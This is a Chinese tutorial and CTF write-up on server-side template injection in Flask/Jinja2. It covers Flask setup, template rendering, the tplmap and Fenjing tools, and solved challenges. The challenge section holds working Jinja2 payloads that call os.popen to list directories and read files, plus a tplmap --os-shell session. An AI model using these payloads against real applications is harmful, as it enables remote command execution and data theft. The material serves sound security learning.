<meta name="referrer" content="no-referrer">

## SSTI

python: jinja2 mako tornado django 
php:smarty twig Blade 
java:jade velocity jsp

[TOC]

![](https://gitee.com/bx33661/image/raw/master/path/%E4%B8%8B%E8%BD%BD.png)



### 原理分析

**SSTI 就是服务器端模板注入（Server-Side Template Injection）**

现在一些框架采用的都是*MVC*模式,

> MVC（Model-View-Controller）是一种常用的软件架构模式，尤其在Web开发中广泛应用。MVC模式将应用程序分为三个核心组件：Model（模型）、View（视图）和Controller（控制器），以实现清晰的分离关注点，使应用程序更易于管理和扩展。
>
> 许多现代Web框架都基于MVC模式，例如：
>
> - **Django**（Python）
> - **Ruby on Rails**（Ruby）
> - **Spring MVC**（Java）
> - **ASP.NET MVC**（C#）
> - **Laravel**（PHP）

漏洞成因：

SSTI，主要与服务器端模板引擎的使用不当有关。当开发者在处理用户输入时，没有正确地对这些输入进行过滤或转义，导致恶意用户可以将恶意代码注入到模板中，最终在服务器上执行任意代码。

----

### 环境搭建

> 搭建flask框架，python3.11

![_images/flask-horizontal.png](https://gitee.com/bx33661/image/raw/master/path/flask-horizontal.png)

#### 初始化

新建一个`app.py`文件

```python
from flask import Flask

app = Flask(__name__)


@app.route('/')
def hello_world():  # put application's code here
    return 'Hello World!'


if __name__ == '__main__':
    app.run()
```

运行，结果在`http://127.0.0.1:5000`

```python
FLASK_APP = app.py
FLASK_ENV = development
FLASK_DEBUG = 0
In folder E:/py/flaskProject
C:\Users\lenovo\.conda\envs\flaskProject\python.exe -m flask run 
 * Serving Flask app 'app.py'
 * Debug mode: off
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on http://127.0.0.1:5000
Press CTRL+C to quit
127.0.0.1 - - [30/Aug/2024 21:22:46] "GET / HTTP/1.1" 200 -
127.0.0.1 - - [30/Aug/2024 21:22:47] "GET /favicon.ico HTTP/1.1" 404 -
```

![image-20240830212454991](https://gitee.com/bx33661/image/raw/master/path/image-20240830212454991.png)



#### 添加路径装饰器

```python
from flask import Flask

app = Flask(__name__)

@app.route('/')
def hello_world():
    return 'Hello World!'
#添加路径
@app.route('/bx')
def call_bx():
    return "3366"
#添加动态网址
@app.route("/hello/<name>")
def hello_user(name):
  return "user:%s"%name

if __name__ == '__main__':
    app.debug = True   #添加调试
    app.run()
```

> `@app.route()` 是 Flask 中用来定义路由的装饰器，用于将特定的 URL 路径与对应的视图函数关联起来。当用户访问这个路径时，Flask 会调用与该路径关联的视图函数并将其返回值发送给客户端。



#### 模板渲染（render）

```python
from flask import Flask
from flask import render_template

app = Flask(__name__)

@app.route('/')
def hello():
    return "hello SSTI!"

@app.route("/tem/")
@app.route("/tem/<name>")
def hello_name(name = None):
    return render_template("hello.html",name=name)

if __name__ == '__main__':
    app.run()
```

在模板渲染系统中，`render_template`

> `render_template` 是 Flask 中用于渲染模板的函数，它将模板文件与数据结合起来生成动态 HTML 页面，并返回给客户端。这个功能使得你可以将 HTML 内容与 Python 代码分离，方便管理和维护。
>
> ### 1. 基本使用
>
> ```python
> from flask import Flask, render_template
> 
> app = Flask(__name__)
> 
> @app.route('/')
> def index():
>     return render_template('index.html')
> ```
>
> 在这个例子中：
>
> - `render_template('index.html')`：`index.html` 是一个存放在 `templates` 目录中的模板文件。`render_template` 会加载这个文件，并生成相应的 HTML 内容。
> - Flask 默认在项目根目录下的 `templates` 文件夹中查找模板文件。
>
> ### 2. 传递数据到模板
>
> 你可以将数据传递给模板，这些数据可以在模板中使用。比如，你想在模板中显示用户的名字：
>
> ```python
> @app.route('/user/<username>')
> def show_user_profile(username):
>     return render_template('profile.html', username=username)
> ```
>
> 在这个例子中：
>
> - `render_template('profile.html', username=username)`：这里将 `username` 变量传递给模板 `profile.html`。
> - 在 `profile.html` 中，你可以使用 `{{ username }}` 来引用传递的 `username` 变量。
>
> ### 3. 模板文件 (`profile.html`) 示例
>
> 假设 `profile.html` 的内容如下：
>
> ```html
> <!DOCTYPE html>
> <html lang="en">
> <head>
>     <meta charset="UTF-8">
>     <title>User Profile</title>
> </head>
> <body>
>     <h1>Welcome, {{ username }}!</h1>
> </body>
> </html>
> ```
>
> 在这个模板中：
>
> - `{{ username }}` 是一个占位符，它将被传递过来的 `username` 值替换。
> - 当 `username` 是 `'john'` 时，最终生成的 HTML 会是：
>   
> ```html
> <!DOCTYPE html>
> <html lang="en">
> <head>
>     <meta charset="UTF-8">
>     <title>User Profile</title>
> </head>
> <body>
>     <h1>Welcome, john!</h1>
> </body>
> </html>
> ```
>
> ### 4. 模板继承
>
> Flask 的模板系统基于 Jinja2，它支持模板继承。可以定义一个基础模板，并让其他模板继承它，从而实现页面结构的复用。
>
> 例如，定义一个基础模板 `base.html`：
>
> ```html
> <!DOCTYPE html>
> <html lang="en">
> <head>
>     <meta charset="UTF-8">
>     <title>{% block title %}My App{% endblock %}</title>
> </head>
> <body>
>     <header>
>         <h1>My Application</h1>
>     </header>
>     <div class="content">
>         {% block content %}{% endblock %}
>     </div>
> </body>
> </html>
> ```
>
> 在其他模板中继承 `base.html`：
>
> ```html
> {% extends "base.html" %}
> 
> {% block title %}User Profile{% endblock %}
> 
> {% block content %}
>     <h1>Welcome, {{ username }}!</h1>
> {% endblock %}
> ```
>
> - `{% extends "base.html" %}` 表示这个模板继承了 `base.html`。
> - `{% block title %}` 和 `{% block content %}` 用来定义模板中可以被子模板覆盖的部分。
>
> ### 5. 总结
>
> `render_template` 的逻辑如下：
>
> 1. **查找模板文件**：从 `templates` 目录中查找指定的模板文件。
> 2. **渲染模板**：将传递给模板的变量与模板结合，生成最终的 HTML 内容。
> 3. **返回响应**：将生成的 HTML 内容作为响应返回给客户端。



#### 一个简单的例子

创建一个模板，放在`templates`文件下的`hello.html`

```html
<!DOCTYPE html>
<html>
  <head>
    <title>{{title}} - SSTI</title>
  </head>
 <body>
      <h1>Let's go,we learn SSTI! BY {{user.name}}!</h1>
  </body>
</html>
```

创建`app.py`

```python
from flask import Flask
from flask import render_template

app = Flask(__name__)

@app.route('/')
@app.route('/hello')
def index():
   user = {'name': 'bx33661'}
   return render_template("hello.html",title='Home',user=user)

if __name__ == '__main__':
    app.run()
```

![image-20240830220343670](https://gitee.com/bx33661/image/raw/master/path/image-20240830220343670.png)



### 漏洞及利用原理

#### Python的理解

魔术方法：

```
__class__            //类的一个内置属性，表示实例对象的类。
__base__             //类型对象的直接基类
__bases__            //类型对象的全部基类，以元组形式，类型的实例通常没有属性 __bases__
__mro__              //查看继承关系和调用顺序，返回元组。此属性是由类组成的元组，在方法解析期间会基于它来查找基类。
```





----

### 工具辅助

#### 1. tplmap

*我是安装在kail上了，采用的是python2环境*

**官网：**  https://github.com/epinna/tplmap 

**具体安装讲解可以看这篇文章：** https://www.cnblogs.com/ktsm/p/15691652.html



#### 2. Fenjing（焚靖）

![img](https://gitee.com/bx33661/image/raw/master/path/fenjing.webp)



> 官方网站： https://github.com/Marven11/Fenjing?tab=readme-ov-file
>
> 焚靖是一个针对CTF比赛中Jinja SSTI绕过WAF的全自动脚本，可以自动攻击给定的网站或接口，省去手动测试接口，fuzz题目WAF的时间。

1. Python-pipx安装

```
# 首先使用apt/dnf/pip/...安装pipx
#pip install pipx
# 然后用pipx自动创建独立的虚拟环境并进行安装
pipx install fenjing
fenjing webui
# fenjing scan --url 'http://xxxx:xxx'
```

2. docker安装

```
docker run --net host -it marven11/fenjing webui
```

进入工具

![image-20240831123007941](https://gitee.com/bx33661/image/raw/master/path/image-20240831123007941.png)



----

### 题目实战

#### NSSCTF--[HNCTF 2022 WEEK2]ez_SSTI

1. 手工

Payload:

```
?name={{config.__class__.__init__.__globals__[%27os%27].popen(%27cat%20app.py%27).read()}}
```

我看了一下`app.py`

```python
from flask import Flask, render_template_string, request

app = Flask(__name__)

@app.route("/")
def app_index():
    name = request.args.get('name')
    blacklist = []

    if name:
        for forbidden_name in blacklist:
            if forbidden_name in name:
                return 'Hacker'

    template = '''
    {% block body %}
    <div class="center-content error">
        <h1>WELCOME TO HNCTF</h1>
        <a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#python" id="test" target="_blank">
            What is server-side template injection?
        </a>
        <h3>%s</h3>
    </div>
    {% endblock %}
    ''' % name

    return render_template_string(template)

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=80)
```



2. 利用工具--fenjing

![dsds](https://gitee.com/bx33661/image/raw/master/path/image-20240831133051643.png)



#### [安洵杯 2020]Normal SSTI

1. 使用Fenjing

![image-20240831135144455](https://gitee.com/bx33661/image/raw/master/path/image-20240831135144455.png)



#### [HNCTF 2022 WEEK3]ssssti

1. 使用使用Fenjing

![image-20240831144114496](https://gitee.com/bx33661/image/raw/master/path/image-20240831144114496.png)



#### CTFSHOW----web361

##### 手工

```
?name={{%20config.__class__.__init__.__globals__[%27os%27].popen(%27ls%20/%27).read()%20}}

###
Hello
app bin boot dev etc flag home lib lib64 media mnt opt proc root run sbin srv start.sh sys tmp usr var
###
```

打开文件

```
?name={{%20config.__class__.__init__.__globals__[%27os%27].popen(%27cat%20/flag%27).read()%20}}
```

![image-20240830170313737](https://gitee.com/bx33661/image/raw/master/path/image-20240830170313737.png)

##### 使用Tplmap

```bash
python2 tplmap.py -u 'https://727c5e75-4ba9-40ce-8fe3-dafdafd6990d.challenge.ctf.show/?name'
```

![image-20240830165245938](https://gitee.com/bx33661/image/raw/master/path/image-20240830165245938.png)

```bash
#直接获取shell
python2 tplmap.py -u 'https://727c5e75-4ba9-40ce-8fe3-dafdafd6990d.challenge.ctf.show/?name' --os-shell

[+] Run commands on the operating system.
posix-linux $ ls
app.py
posix-linux $ ls /
\app
bin
boot
dev
etc
flag
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
start.sh
sys
tmp
usr
var
posix-linux $ cat /flag
ctfshow{82f81a13-a157-49a5-ba00-cb23de3238cb}
```









----

### 参考文章、资料

**先知社区：**https://xz.aliyun.com/t/3679?time__1311=n4%2Bxnii%3DoGqmqDK0QDODlx6e0%3Dnemb%2BOq0I55%3Dx

**最全SSTI模板注入waf绕过总结（6700+字数！）**https://blog.csdn.net/2301_76690905/article/details/134301620

